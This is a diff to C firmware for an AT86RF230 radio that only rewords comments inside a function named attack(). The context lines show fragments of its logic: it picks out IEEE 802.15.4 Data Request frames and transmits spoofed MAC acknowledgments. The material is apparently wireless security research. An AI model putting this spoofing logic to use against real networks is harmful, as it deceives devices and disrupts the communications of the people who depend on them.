@@ -39,7 +39,7 @@ bool attack(void)
 	if (spi_recv() != 12) {
 		/*
 		 * Ignore packets whose length does not match
-		 * the typical length of Data Request commands
+		 * the typical length of Data Requests
 		 */
 		spi_end();
 		return 1;
@@ -124,7 +124,7 @@ bool attack(void)
 	_delay_us(32);
 	spi_recv();
 
-	/* Make sure that it is a Data Request command */
+	/* Make sure that it is a Data Request */
 	_delay_us(32);
 	if (spi_recv() != 0x04) {
 		spi_end();
@@ -144,7 +144,7 @@ bool attack(void)
 	/* Wait for the transmission of the spoofed packet */
 	_delay_us(128);
 
-	/* Spoof a MAC Acknowledgment packet */
+	/* Spoof a MAC acknowledgment */
 	spi_begin();
 	spi_send(AT86RF230_BUF_WRITE);
 	spi_send(5);
